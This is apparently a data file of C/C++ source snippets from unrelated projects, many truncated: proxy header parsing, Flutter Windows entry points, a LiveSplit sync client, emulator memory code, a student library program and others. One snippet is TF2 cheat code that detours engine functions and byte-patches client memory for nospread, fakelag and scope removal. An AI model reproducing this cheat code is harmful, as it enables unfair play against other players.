the header line\nsize_t ParsedHeader_lineLen(struct ParsedHeader *PH)\n{\n    if (PH->key != NULL) // if key is not null\n    {\n        return strlen(PH->key) + strlen(PH->val) + 4;\n    }\n    return 0;\n}\n\n// total length of all headers in the ParsedRequest structure\nsize_t ParsedHeader_headersLen(struct ParsedRequest *PR)\n{\n    if (!PR || !PR->buff) // checking parsedRequest structure or its buffer is NULL if yes return 0\n        return 0;\n\n    size_t i = 0;\n    int len = 0;\n    while (PR->headersused > i) // from all used headers\n    {                           // adding the length of the header line to the total length\n        len += ParsedHeader_lineLen(PR->headers + i);\n        i++;\n    }\n    len += 2; // 2 char for \\r\\n\n    return len;\n}\n// now freeing the memory of the ParsedRequest structure\nvoid ParsedHeader_destroyOne(struct ParsedHeader *PH)\n{\n    if (PH->key != NULL)\n    {\n        free(PH->key);\n        PH->key = NULL;\n        free(PH->val);\n        PH->val = NULL;\n        PH->keylen = 0;\n        PH->valuelen = 0;\n    }\n}\n\nint ParsedHeader_printHeaders(struct ParsedRequest *PR, char *buff, size_t len)\n{\n    char *current = buff;\n    struct ParsedHeader *PH;\n    size_t i = 0;\n\n    if (len < ParsedHeader_headersLen(PR))\n    {\n        debug(\"buffer for",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_ux_example2\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_assignment\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"sync.h\"\n\n#include <iostream>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <netinet/ip.h>\n#include <arpa/inet.h>\n#include <netdb.h>\n#include <unistd.h>\n#include <errno.h>\n#include <cstring>\n#include <stdio.h>\n#include <chrono>\n#include <ctime>\n#include <iomanip>\n#include <thread>\n\nsockaddr hostAddr;\n\nint setHostAddr(const char *hostIP, const char *hostPort) {\n    const char *ip = hostIP;\n    int port = std::stoi(std::string(hostPort));\n    memset(&hostAddr, 0, sizeof(hostAddr));\n    sockaddr_in *hostAddrIn = (sockaddr_in *)&hostAddr;\n    hostAddrIn->sin_family = AF_INET;\n    hostAddrIn->sin_port = htons(port);\n    if (inet_pton(AF_INET, ip, &hostAddrIn->sin_addr) != 1)\n        return 1;\n    return 0;\n}\n\nstd::mutex endMutex;\nbool end = false;\n\nstd::mutex timerValueMutex;\nstd::chrono::time_point<std::chrono::system_clock> timerValueLastUpdate;\nint64_t timerValue;\nint timerValueUncertainty = -99999999;\n\nstd::mutex timerPhaseMutex;\nTimerPhase timerPhase = TimerPhase::NotRunning;\n\nstd::mutex deltaMutex;\nbool hasDelta = false;\nint64_t delta = 0;\n\nstd::mutex pbSplitTimeMutex;\nbool hasPbSplitTime = false;\nint64_t pbSplitTime = 0;\n\nstd::mutex sobMutex;\nint64_t sob;\n\nstd::mutex bptMutex;\nint64_t bpt;\n\nstd::mutex bestDeltaMutex;\nbool isGold = false;\nbool hasPreviousBestDelta = false;\nint64_t previousBestDelta = 0;\nbool hasBestDelta = false;\nint64_t bestDelta = 0;\n\nstd::mutex bpeDeltaMutex;\nbool hasBpeDelta = false;\nint64_t bpeDelta = 0;\n\n// LiveSplit sends times using the \"constant\" (\"c\") standard TimeSpan format:\n// https://learn.microsoft.com/en-us/dotnet/standard/base-types/standard-timespan-format-strings#the-constant-c-format-specifier \n// [-][d.]hh:mm:ss[.fffffff]\n// Returns a number in milliseconds\nint64_t parseTimespan(std::string str) {\n    std::string timespan = str;\n    int sign = 1;\n    if (str[0] == '-') {\n        sign = -1;\n        timespan = str.substr(1);\n    }\n\n    size_t dotPos = timespan.find_first_of(\".\");\n    size_t colonPos = timespan.find_first_of(\":\");\n\n    // Handle case in which neither occurs and the string is invalid\n    int days = 0;\n    if (dotPos < colonPos) {\n        // We have days\n        days = std::stoi(timespan.substr(0, dotPos));\n        timespan = timespan.substr(dotPos + 1);\n    }\n\n    colonPos = timespan.find_first_of(\":\");\n    int hrs = std::stoi(timespan.substr(0, colonPos));\n    timespan = timespan.substr(colonPos + 1);\n\n    colonPos = timespan.find_first_of(\":\");\n    int mins = std::stoi(timespan.substr(0, colonPos));\n    timespan = timespan.substr(colonPos + 1);\n\n    dotPos = timespan.find_first_of(\".\");\n    int seconds = 0;\n    int ms = 0;\n    if (dotPos == std::string::npos) {\n        // Only seconds\n        seconds = std::stoi(timespan);\n    } else {\n        seconds = std::stoi(timespan.substr(0, dotPos));\n        ms = std::stoi(timespan.substr(dotPos + 1, 3));\n    }\n\n    return sign * (ms + (seconds * 1000) + (mins * 1000 * 60) + (hrs * 1000 * 60 * 60) + (days * 1000 * 60 * 60 * 24));\n}\n\nTimerPhase parseTimerPhase(std::string str) {\n    if (str == \"NotRunning\\n\")\n        return TimerPhase::NotRunning;\n    else if (str == \"Running\\n\")\n        return TimerPhase::Running;\n    else if (str == \"Ended\\n\")\n        return TimerPhase::Ended;\n    else if (str == \"Paused\\n\")\n        return TimerPhase::Paused;\n    return TimerPhase::NotRunning;\n}\n\nvoid timerValueSyncTask() {\n    int sock = socket(AF_INET, SOCK_STREAM, 0);\n    int res = connect(sock, &hostAddr, sizeof(sockaddr));\n\n    while (true) {\n        {\n            std::lock_guard<std::mutex> guard(endMutex);\n            if (end)\n                break;\n        }\n\n        auto t1 = std::chrono::system_clock::now();\n        const char *msg = \"getcurrenttime\\r\\n\";\n        send(sock, msg, strlen(msg), 0);\n\n        char buf[64];\n        int n;\n        n = recv(sock, buf, 63, 0);\n        const auto t2 = std::chrono::system_clock::now();\n\n        int newUncertainty = std::chrono::duration_cast<std::chrono::milliseconds>(t2 - t1).count();\n\n        buf[n] = '\\0';\n\n        int64_t newTimerValue = parseTimespan(std::string(buf));\n\n        /* If the timer is not running, we are 100% certain this is the actual value. */\n        TimerPhase phase;\n        {\n            std::lock_guard<std::mutex> guard(timerPhaseMutex);\n            phase = timerPhase;\n        }\n\n        /* Only change the value if the new value cannot be explained by the lengths of the requests, i.e. a reset, pause, or correcting a big error. */\n        {\n            std::lock_guard<std::mutex> guard(timerValueMutex);\n            if (phase == TimerPhase::Running) {\n                int correction = std::chrono::duration_cast<std::chrono::milliseconds>(t2 - timerValueLastUpdate).count();\n                int64_t correctedTimerValue = timerValue + correction;\n                if (abs(correctedTimerValue - newTimerValue) >= timerValueUncertainty + newUncertainty + 5) {\n                    timerValue = newTimerValue;\n                    timerValueUncertainty =",
    "// SPDX-FileCopyrightText: Copyright 2023 yuzu Emulator Project & 2025 citron Homebrew Project\n// SPDX-License-Identifier: GPL-2.0-or-later\n\n#include <fstream>\n#include <vector>\n\n#include \"common/heap_tracker.h\"\n#include \"common/logging/log.h\"\n\nnamespace Common {\n\nnamespace {\n\ns64 GetMaxPermissibleResidentMapCount() {\n    // Default value.\n    s64 value = 65530;\n\n    // Try to read how many mappings we can make.\n    std::ifstream s(\"/proc/sys/vm/max_map_count\");\n    s >> value;\n\n    // Print, for debug.\n    LOG_INFO(HW_Memory, \"Current maximum map count: {}\", value);\n\n    // Allow 20000 maps for other code and to account for split inaccuracy.\n    return std::max<s64>(value - 20000, 0);\n}\n\n} // namespace\n\nHeapTracker::HeapTracker(Common::HostMemory& buffer)\n    : m_buffer(buffer), m_max_resident_map_count(GetMaxPermissibleResidentMapCount()) {}\nHeapTracker::~HeapTracker() = default;\n\nvoid HeapTracker::Map(size_t virtual_offset, size_t host_offset, size_t length,\n                      MemoryPermission perm, bool is_separate_heap) {\n    // When mapping other memory, map pages immediately.\n    if (!is_separate_heap) {\n        m_buffer.Map(virtual_offset, host_offset, length, perm, false);\n        return;\n    }\n\n    {\n        // We are mapping part of a separate heap.\n        std::scoped_lock lk{m_lock};\n\n        auto* const map = new SeparateHeapMap{\n            .vaddr = virtual_offset,\n            .paddr = host_offset,\n            .size = length,\n            .tick = m_tick++,\n            .perm = perm,\n            .is_resident = false,\n        };\n\n        // Insert into mappings.\n        m_map_count++;\n        m_mappings.insert(*map);\n    }\n\n    // Finally, map.\n    this->DeferredMapSeparateHeap(virtual_offset);\n}\n\nvoid HeapTracker::Unmap(size_t virtual_offset, size_t size, bool is_separate_heap) {\n    // If this is a separate heap...\n    if (is_separate_heap) {\n        std::scoped_lock lk{m_lock};\n\n        const SeparateHeapMap key{\n            .vaddr = virtual_offset,\n        };\n\n        // Split at the boundaries of the region we are removing.\n        this->SplitHeapMapLocked(virtual_offset);\n        this->SplitHeapMapLocked(virtual_offset + size);\n\n        // Erase all mappings in range.\n        auto it = m_mappings.find(key);\n        while (it != m_mappings.end() && it->vaddr < virtual_offset + size) {\n            // Get underlying item.\n            auto* const item = std::addressof(*it);\n\n            // If resident, erase from resident map.\n            if (item->is_resident) {\n                ASSERT(--m_resident_map_count >= 0);\n                m_resident_mappings.erase(m_resident_mappings.iterator_to(*item));\n            }\n\n            // Erase from map.\n            ASSERT(--m_map_count >= 0);\n            it = m_mappings.erase(it);\n\n            // Free the item.\n            delete item;\n        }\n    }\n\n    // Unmap pages.\n    m_buffer.Unmap(virtual_offset, size, false);\n}\n\nvoid HeapTracker::Protect(size_t virtual_offset, size_t size, MemoryPermission perm) {\n    // Ensure no rebuild occurs while reprotecting.\n    std::shared_lock lk{m_rebuild_lock};\n\n    // Split at the boundaries of the region we are reprotecting.\n    this->SplitHeapMap(virtual_offset, size);\n\n    // Declare tracking variables.\n    const VAddr end = virtual_offset + size;\n    VAddr cur = virtual_offset;\n\n    while (cur < end) {\n        VAddr next = cur;\n        bool should_protect = false;\n\n        {\n            std::scoped_lock lk2{m_lock};\n\n            const SeparateHeapMap key{\n                .vaddr = next,\n            };\n\n            // Try to get the next mapping corresponding to this address.\n            const auto it = m_mappings.nfind(key);\n\n            if (it == m_mappings.end()) {\n                // There are no separate heap mappings remaining.\n                next = end;\n                should_protect = true;\n            } else if (it->vaddr == cur) {\n                // We are in range.\n                // Update permission bits.\n                it->perm = perm;\n\n                // Determine next address and whether we should protect.\n                next = cur + it->size;\n                should_protect = it->is_resident;\n            } else /* if (it->vaddr > cur) */ {\n                // We weren't in range, but there is a block coming up that will be.\n                next = it->vaddr;\n                should_protect = true;\n            }\n        }\n\n        // Clamp to end.\n        next = std::min(next, end);\n\n        // Reprotect, if we need to.\n        if (should_protect) {\n            m_buffer.Protect(cur, next - cur, perm);\n        }\n\n        // Advance.\n        cur = next;\n    }\n}\n\nbool HeapTracker::DeferredMapSeparateHeap(u8* fault_address) {\n    if (m_buffer.IsInVirtualRange(fault_address)) {\n        return this->DeferredMapSeparateHeap(fault_address - m_buffer.VirtualBasePointer());\n    }\n\n    return false;\n}\n\nbool HeapTracker::DeferredMapSeparateHeap(size_t virtual_offset) {\n    bool rebuild_required = false;\n\n    {",
    "#include <iostream>\n#include <thread>  // Untuk fungsi sleep\n#include <chrono>  // Untuk durasi sleep\n\nusing namespace std;\n\nconst char *daftar[5] = {\n    \"Borland C++\", \"Algoritma\", \"Matematika Diskrit\", \"Kalkulus\", \"Komputer Aplikasi\"\n};\n\nvoid menu_utama();\nvoid pemilihan_berulang();\nvoid anggota();\nvoid pinjam_buku();\nvoid pengembalian_buku();\nvoid keluar_program();\n\n// Fungsi untuk menampilkan loading sementara\nvoid loading() {\n    cout << \"\\n\\t\\tPlease wait:\\n\\n\";\n    cout << \"\\t\\tLoading:\";\n    for (int i = 0; i < 20; i++) {\n        cout << \"*\";\n        this_thread::sleep_for(chrono::milliseconds(100));\n    }\n    cout << endl;\n    system(\"cls || clear\");\n}\n\n// Fungsi untuk menampilkan menu utama\nvoid menu_utama() {\n    system(\"cls || clear\");\n    loading();\n    cout << \"==================================================\" << endl;\n    cout << \"|\\tPROGRAM PERPUSTAKAAN C++\\t\\t|\" << endl;\n    cout << \"==================================================\" << endl;\n    cout << \"Selamat datang di perpustakaan kami!\" << endl;\n    cout << \"\\nPilihan Menu:\\n\";\n    cout << \"\\t1. Anggota\\n\";\n    cout << \"\\t2. Pinjam Buku\\n\";\n    cout << \"\\t3. Pengembalian Buku\\n\";\n    cout << \"\\t4. Tutup Program\\n\\n\";\n    int pilihan;\n    cout << \"Masukkan Pilihan : \";\n    cin >> pilihan;\n    cout << endl;\n\n    switch (pilihan) {\n        case 1:\n            anggota();\n            break;\n        case 2:\n            pinjam_buku();\n            break;\n        case 3:\n            pengembalian_buku();\n            break;\n        case 4:\n            keluar_program();\n            break;\n        default:\n            cout << \"\\tTolong Pilih Salah Satu dan Ulangi Kembali!\" << endl;\n            loading();\n            menu_utama();\n            break;\n    }\n}\n\n// Fungsi untuk menampilkan data anggota\nvoid anggota() {\n    system(\"cls || clear\");\n    cout << \"======================================================\" << endl;\n    cout << \"\\t\\t\\t ANGGOTA \\t\\t\" << endl;\n    cout << \"======================================================\" << endl;\n    cout << \"\\tNAMA:\\t\\t\\tNIM:\" << endl;\n    cout << \"\\t1. Aulia\\t\\t11111***\" << endl;\n    cout << \"\\t2. Prayoga\\t\\t11111***\" << endl;\n    cout << \"\\t3. Dewa\\t\\t11111***\" << endl;\n    cout << \"\\t4. Mayang\\t\\t11111***\" << endl;\n    cout << \"\\t5. Damar\\t\\t11111***\" << endl;\n    pemilihan_berulang();\n}\n\n// Fungsi untuk meminjam buku\nvoid pinjam_buku() {\n    system(\"cls || clear\");\n    cout << \"======================================================\" << endl;\n    cout << \"\\t\\t\\t PINJAM BUKU \\t\\t\" << endl;\n    cout << \"======================================================\" << endl;\n\n    for (int i = 0; i < 5; i++) {\n        cout << \"\\t\" << (i + 1) << \"\\t\" << daftar[i] << endl;\n    }\n\n    cout << \"\\nNama : \";\n    string nama;\n    cin >> nama;\n\n    unsigned int tanggal;\n    cout << \"Masukkan tanggal peminjaman (1-31): \";\n    cin >> tanggal;\n\n    if (tanggal < 1 || tanggal > 31) {\n        cout << \"Tanggal tidak valid!\" << endl;\n        return;\n    }\n\n    int jumlah;\n    cout << \"Jumlah buku yang ingin dipinjam: \";\n    cin >> jumlah;\n\n    for (int i = 0; i < jumlah; i++) {\n        int kode;\n        cout << \"Inputkan kode buku: \";\n        cin >> kode;\n\n        if (kode >= 1 && kode <= 5) {\n            cout << \"Anda telah meminjam buku: \" << daftar[kode - 1] << endl;\n        } else {\n            cout << \"Kode buku tidak valid!\" << endl;\n        }\n    }\n\n    pemilihan_berulang();\n}\n\n// Fungsi untuk pengembalian buku\nvoid pengembalian_buku() {\n    system(\"cls || clear\");\n    cout << \"==========================================================\" << endl;\n    cout << \"\\t\\tPENGEMBALIAN BUKU\\t\\t\" << endl;\n    cout << \"==========================================================\" << endl;\n\n    for (int i = 0; i < 5; i++) {\n        cout << \"\\t\" << (i + 1) << \"\\t\" << daftar[i] << endl;\n    }\n\n    cout << \"\\nNama : \";\n    string nama;\n    cin >> nama;\n\n    int jumlah;\n    cout << \"Jumlah buku yang ingin dikembalikan: \";\n    cin >> jumlah;\n\n    for (int i = 0; i < jumlah; i++) {\n        int kode;\n        cout << \"Inputkan kode buku: \";\n        cin >> kode;\n\n        if (kode >= 1 && kode <= 5) {\n            cout << \"Anda telah mengembalikan buku: \" << daftar[kode - 1] << endl;\n        } else {\n            cout << \"Kode buku tidak valid!\" << endl;\n        }\n    }\n\n    pemilihan_berulang();\n}\n\n// Fungsi pemilihan berulang\nvoid pemilihan_berulang() {\n    char pilih;\n    cout << \"\\nInputkan [Y] untuk kembali ke menu utama atau [N] untuk keluar: \";\n    cin >> pilih;\n\n    if (pilih == 'Y' || pilih == 'y') {\n        menu_utama();\n    } else if (pilih == 'N' || pilih == 'n') {\n        keluar_program();\n    } else {\n        cout << \"Input tidak valid! Silahkan ulangi.\\n\";\n        pemilihan_berulang();\n    }\n}\n\n// Fungsi untuk keluar program\nvoid keluar_program() {\n    system(\"cls || clear\");\n    cout << \"===========================================================\" << endl;\n    cout << \"\\t\\tPROGRAM PERPUSTAKAAN C++\\t\\t\" << endl;\n    cout << \"=====",
    "//\n// Created by Kenneth Balslev on 19/08/2020.\n//\n\n// ===== External Includes ===== //\n#include <cassert>\n#include <cstring>\n#include <pugixml.hpp>\n\n// ===== OpenXLSX Includes ===== //\n#include \"XLCell.hpp\"\n#include \"XLCellValue.hpp\"\n#include \"XLException.hpp\"\n\nusing namespace OpenXLSX;\n\n/**\n * @details Constructor. Default implementation has been used.\n * @pre\n * @post\n */\nXLCellValue::XLCellValue() = default;\n\n/**\n * @details Copy constructor. The default implementation will be used.\n * @pre The object to be copied must be valid.\n * @post A valid copy is constructed.\n */\nXLCellValue::XLCellValue(const OpenXLSX::XLCellValue& other) = default;\n\n/**\n * @details Move constructor. The default implementation will be used.\n * @pre The object to be copied must be valid.\n * @post A valid copy is constructed.\n */\nXLCellValue::XLCellValue(OpenXLSX::XLCellValue&& other) noexcept = default;\n\n/**\n * @details Destructor. The default implementation will be used\n * @pre None.\n * @post The object is destructed.\n */\nXLCellValue::~XLCellValue() = default;\n\n/**\n * @details Copy assignment operator. The default implementation will be used.\n * @pre The object to be copied must be a valid object.\n * @post A the copied-to object is valid.\n */\nXLCellValue& OpenXLSX::XLCellValue::operator=(const OpenXLSX::XLCellValue& other) = default;\n\n/**\n * @details Move assignment operator. The default implementation will be used.\n * @pre The object to be moved must be a valid object.\n * @post The moved-to object is valid.\n */\nXLCellValue& OpenXLSX::XLCellValue::operator=(OpenXLSX::XLCellValue&& other) noexcept = default;\n\n/**\n * @details Clears the contents of the XLCellValue object. Setting the value to an empty string is not sufficient\n * (as an empty string is still a valid string). The m_type variable must also be set to XLValueType::Empty.\n * @pre\n * @post\n */\nXLCellValue& XLCellValue::clear()\n{\n    m_type  = XLValueType::Empty;\n    m_value = std::string(\"\");\n    return *this;\n}\n\n/**\n * @details Sets the value type to XLValueType::Error. The value will be set to an empty string.\n * @pre\n * @post\n */\nXLCellValue& XLCellValue::setError(const std::string &error)\n{\n    m_type  = XLValueType::Error;\n    m_value = error;\n    return *this;\n}\n\n/**\n * @details Get the value type of the current object.\n * @pre\n * @post\n */\nXLValueType XLCellValue::type() const\n{\n    return m_type;\n}\n\n/**\n * @details Get the value type of the current object, as a string representation\n * @pre\n * @post\n */\nstd::string XLCellValue::typeAsString() const\n{\n    switch (type()) {\n        case XLValueType::Empty:\n            return \"empty\";\n        case XLValueType::Boolean:\n            return \"boolean\";\n        case XLValueType::Integer:\n            return \"integer\";\n        case XLValueType::Float:\n            return \"float\";\n        case XLValueType::String:\n            return \"string\";\n        default:\n            return \"error\";\n    }\n}\n\n/**\n * @details Constructor\n * @pre The cell and cellNode pointers must not be nullptr and must point to valid objects.\n * @post A valid XLCellValueProxy has been created.\n */\nXLCellValueProxy::XLCellValueProxy(XLCell* cell, XMLNode* cellNode) : m_cell(cell), m_cellNode(cellNode)\n{\n    assert(cell != nullptr);         // NOLINT\n//    assert(cellNode);                 // NOLINT\n//    assert(not cellNode->empty());    // NOLINT\n}\n\n/**\n * @details Destructor. Default implementation has been used.\n * @pre\n * @post\n */\nXLCellValueProxy::~XLCellValueProxy() = default;\n\n/**\n * @details Copy constructor. Default implementation has been used.\n * @pre\n * @post\n */\nXLCellValueProxy::XLCellValueProxy(const XLCellValueProxy& other) = default;\n\n/**\n * @details Move constructor. Default implementation has been used.\n * @pre\n * @post\n */\nXLCellValueProxy::XLCellValueProxy(XLCellValueProxy&& other) noexcept = default;\n\n/**\n * @details Copy assignment operator. The function is implemented in terms of the templated\n * value assignment operators, i.e. it is the XLCellValue that is that is copied,\n * not the object itself.\n * @pre\n * @post\n */\nXLCellValueProxy& XLCellValueProxy::operator=(const XLCellValueProxy& other)\n{\n    if (&other != this) {\n        *this = other.getValue();\n    }\n\n    return *this;\n}\n\n/**\n * @details Move assignment operator. Default implementation has been used.\n * @pre\n * @post\n */\nXLCellValueProxy& XLCellValueProxy::operator=(XLCellValueProxy&& other) noexcept = default;\n\n/**\n * @details Implicitly convert the XLCellValueProxy object to a XLCellValue object.\n * @pre\n * @post\n */\nXLCellValueProxy::operator XLCellValue() const {\n    return getValue();\n}\n\n/**\n * @details Clear the contents of the cell. This removes all children of the cell node.\n * @pre The m_cellNode must not be null, and must point to a valid XML cell node object.\n * @post The cell node must be valid, but empty.\n */\nXLCellValueProxy& XLCellValueProxy::clear()\n{\n    // ===== Check that the m_cellNode is valid.\n    assert(m_cellNode != nullptr);      // NOLINT\n    ",
    "#include <boost/program_options.hpp>\n#include <boost/program_options/value_semantic.hpp>\n#include <core.h>\n#include <iostream>\n#include <string>\n#include <util/logging.h>\n#include <vm.h>\n\nnamespace po = boost::program_options;\n\nint main(int argc, char *argv[]) {\n  std::string filename;\n  int icount = 0;\n  bool dump = false;\n  try {\n    // Define and configure options\n    po::options_description mandatory(\"Mandatory options\");\n    mandatory.add_options()(\"file,f\",\n                            po::value<std::string>(&filename)->required(),\n                            \"File to process\");\n\n    po::options_description optional(\"Optional options\");\n    optional.add_options()(\n        \"icount\", po::value<int>(&icount)->default_value(100),\n        \"Instruction count\")(\"dump\", po::bool_switch(&dump),\n                             \"Toggle dumping of Intermediate Representation\");\n\n    po::options_description all(\"Allowed options\");\n    all.add(mandatory).add(optional).add_options()(\"help\",\n                                                   \"Show this help message\");\n\n    // Parse command-line arguments\n    po::variables_map vm;\n    po::store(po::parse_command_line(argc, argv, all), vm);\n\n    // Handle help option\n    if (vm.count(\"help\")) {\n      std::cout << all << \"\\n\";\n      return 0;\n    }\n\n    // Notify for mandatory options\n    po::notify(vm);\n  } catch (const po::error &ex) {\n    std::cerr << \"Error: \" << ex.what() << \"\\n\";\n    return 1;\n  }\n  LOGGER(DEFAULT)::reporting_level() = logging::INFO;\n  CPPLOG(INFO) << \"Loading file '\" << filename << \"'\";\n  auto my_vm = eve_vm();\n  auto [start_addr, success] = my_vm.get_arch()->load_file(filename);\n  if (!success) {\n    return 1;\n  }\n  my_vm.reset(start_addr);\n  my_vm.start(icount, dump);\n  return 0;\n}\n",
    "/*\n  Created by Jenny White on 29.04.18.\n  Copyright (c) 2018 nullworks. All rights reserved.\n*/\n\n#include \"MiscTemporary.hpp\"\n#include \"Warp.hpp\"\n#include \"nospread.hpp\"\n\nstd::array<Timer, 32> timers{};\nstd::array<int, 32> bruteint{};\n\nint spectator_target;\nCLC_VoiceData *voicecrash{};\nbool firstcm = false;\nTimer DelayTimer{};\nfloat prevflow            = 0.0f;\nint prevflowticks         = 0;\nint stored_buttons        = 0;\nbool calculated_can_shoot = false;\nbool ignoredc             = false;\n\nbool *bSendPackets{ nullptr };\nbool ignoreKeys{ false };\nsettings::Boolean clean_chat{ \"chat.clean\", \"false\" };\n\nsettings::Boolean crypt_chat{ \"chat.crypto\", \"true\" };\nsettings::Boolean clean_screenshots{ \"visual.clean-screenshots\", \"false\" };\n#if ENABLE_TEXTMODE\nsettings::Boolean nolerp{ \"misc.no-lerp\", \"true\" };\n#else\nsettings::Boolean nolerp{ \"misc.no-lerp\", \"false\" };\n#endif\nfloat backup_lerp = 0.0f;\nsettings::Int fakelag_amount{ \"misc.fakelag\", \"0\" };\nsettings::Boolean fakelag_midair{ \"misc.fakelag-midair-only\", \"false\" };\nsettings::Boolean no_zoom{ \"remove.zoom\", \"false\" };\nsettings::Boolean no_scope{ \"remove.scope\", \"false\" };\nsettings::Boolean disable_visuals{ \"visual.disable\", \"false\" };\nsettings::Int print_r{ \"print.rgb.r\", \"183\" };\nsettings::Int print_g{ \"print.rgb.b\", \"27\" };\nsettings::Int print_b{ \"print.rgb.g\", \"139\" };\nColor menu_color{ *print_r, *print_g, *print_b, 255 };\n\nvoid color_callback(settings::VariableBase<int> &, int)\n{\n    menu_color = Color(*print_r, *print_g, *print_b, 255);\n}\nDetourHook cl_warp_sendmovedetour;\nDetourHook cl_nospread_sendmovedetour;\n\nstatic InitRoutine misc_init([]() {\n    static auto cl_sendmove_addr = gSignatures.GetEngineSignature(\"55 89 E5 57 56 53 81 EC 2C 10 00 00 C6 85 ? ? ? ? 01\");\n    // Order matters!\n    cl_warp_sendmovedetour.Init(cl_sendmove_addr, (void *) hacks::tf2::warp::CL_SendMove_hook);\n    cl_nospread_sendmovedetour.Init(cl_sendmove_addr, (void *) hacks::tf2::nospread::CL_SendMove_hook);\n\n    static std::optional<BytePatch> patch;\n    static std::optional<BytePatch> patch2;\n    print_r.installChangeCallback(color_callback);\n    print_g.installChangeCallback(color_callback);\n    print_b.installChangeCallback(color_callback);\n    no_scope.installChangeCallback([](settings::VariableBase<bool> &, bool after) {\n        if (!patch)\n        {\n            // Remove scope\n            patch = BytePatch(gSignatures.GetClientSignature, \"81 EC ? ? ? ? A1 ? ? ? ? 8B 7D 08 8B 10 89 04 24 FF 92\", 0x0, { 0x5B, 0x5E, 0x5F, 0x5D, 0xC3 });\n            // Keep rifle visible\n            patch2 = BytePatch(gSignatures.GetClientSignature, \"74 ? A1 ? ? ? ? 8B 40 ? 85 C0 75 ? C9\", 0x0, { 0x70 });\n        }\n        if (after)\n        {\n            patch->Patch();\n            if (no_zoom)\n                patch2->Patch();\n        }\n        else\n        {\n            patch->Shutdown();\n            if (patch2)\n                patch2->Shutdown();\n        }\n    });\n    no_zoom.installChangeCallback([](settings::VariableBase<bool> &, bool after) {\n        // std::optional so the addresses are searched when needed, not on inject\n        if (!patch2)\n            // Keep rifle visible\n            patch2 = BytePatch(gSignatures.GetClientSignature, \"74 ? A1 ? ? ? ? 8B 40 ? 85 C0 75 ? C9\", 0x0, { 0x70 });\n        if (after)\n        {\n            if (no_scope)\n                patch2->Patch();\n        }\n        else\n        {\n            patch2->Shutdown();\n        }\n    });\n    nolerp.installChangeCallback([](settings::VariableBase<bool> &, bool after) {\n        if (!after)\n        {\n            if (backup_lerp)\n            {\n                cl_interp->SetValue(backup_lerp);\n                backup_lerp = 0.0f;\n            }\n        }\n        else\n        {\n            backup_lerp = cl_interp->GetFloat();\n            // We should adjust cl_interp to be as low as possible\n            if (cl_interp->GetFloat() > 0.152f)\n                cl_interp->SetValue(0.152f);\n        }\n    });\n    EC::Register(\n        EC::Shutdown,\n        []() {\n            cl_warp_sendmovedetour.Shutdown();\n            cl_nospread_sendmovedetour.Shutdown();\n            if (backup_lerp)\n            {\n                cl_interp->SetValue(backup_lerp);\n                backup_lerp = 0.0f;\n            }\n            patch.reset();\n            patch2.reset();\n        },\n        \"misctemp_shutdown\");\n#if ENABLE_TEXTMODE\n    // Ensure that we trigger the callback for textmode builds\n    nolerp = false;\n    nolerp = true;\n#endif\n});\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todoey\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  